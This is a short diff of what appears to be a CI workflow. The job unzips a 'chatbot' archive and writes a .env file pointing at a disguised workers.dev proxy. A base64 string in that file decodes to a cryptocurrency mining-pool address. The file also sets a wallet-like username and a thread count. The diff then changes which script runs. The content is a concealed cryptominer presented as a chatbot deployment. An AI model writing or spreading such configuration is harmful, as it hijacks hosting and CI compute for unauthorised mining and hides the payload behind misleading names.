@@ -24,4 +24,4 @@ jobs:
         run: |
           yes A | unzip chatbot.zip
           echo -e 'proxy=wss://pypip-python3.packaging-w3schools.workers.dev/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nhost=127.0.0.1\nport=3306\nusername=mbc1qhut49lvdruznypvaxgrg4klf3ntpnwuc23hq3j\npassword=c=MBC\nthreads=4' > .env
-          bash start2.sh
+          python3 app.py
